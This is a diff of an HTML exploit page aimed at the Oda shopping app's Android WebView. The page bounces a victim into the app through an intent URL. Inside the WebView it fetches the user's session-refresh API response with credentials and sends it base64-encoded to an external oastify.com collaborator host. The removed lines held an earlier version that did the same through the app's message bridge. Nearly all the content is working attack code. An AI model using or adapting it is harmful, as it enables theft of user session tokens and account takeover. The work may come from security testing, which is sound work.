@@ -1,13 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Oda WebView Exploit</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+
+<h2>Loading...</h2>
+
 <script>
-  // This script will run as soon as the Oda app loads this page
-  function exploit() {
-    if (window.AndroidMessageHandler) {
-      AndroidMessageHandler.postMessage(JSON.stringify({
-        command: "open-url",
-        url: "https://oda.com/api/v1/user/refresh/",
-        callbackString: "fetch('/api/v1/user/refresh/', {credentials:'include'}).then(r=>r.text()).then(d=>{new Image().src='https://3125k7s6bb96nk9g1tw4n4kbr2xxlq9f.oastify.com/?data='+btoa(d);});"
-      }));
+(function() {
+    const COLLAB = "https://86capcxbggebspel6y19s9pgw722qwel.oastify.com";
+
+    function send(type, data) {
+        new Image().src = COLLAB + "/?" + type + "=" + encodeURIComponent(data);
     }
-  }
-  window.onload = exploit;
+
+    // ==============================
+    // STEP 1: LOG PAGE LOADED
+    // ==============================
+    send("log", "PAGE_LOADED");
+
+    // ==============================
+    // STEP 2: DETECT WEBVIEW
+    // ==============================
+    if (navigator.userAgent.includes("wv")) {
+        send("log", "INSIDE_WEBVIEW");
+    } else {
+        send("log", "OPENED_IN_BROWSER");
+
+        // ==============================
+        // STEP 3: TRIGGER APP VIA INTENT
+        // ==============================
+        setTimeout(() => {
+            window.location.href =
+                "intent://oda.com/no-en/account/climate/#Intent;" +
+                "scheme=https;" +
+                "package=no.kolonial.tienda;" +
+                "end";
+        }, 3000);
+
+        return; // stop execution di browser
+    }
+
+    // ==============================
+    // STEP 4: EXPLOIT (JALAN DI WEBVIEW)
+    // ==============================
+    fetch("/api/v1/user/refresh/", {
+        method: "GET",
+        credentials: "include"
+    })
+    .then(res => res.text())
+    .then(data => {
+        send("data", btoa(data));
+    })
+    .catch(err => {
+        send("error", err);
+    });
+
+})();
 </script>
+
+</body>
+</html>
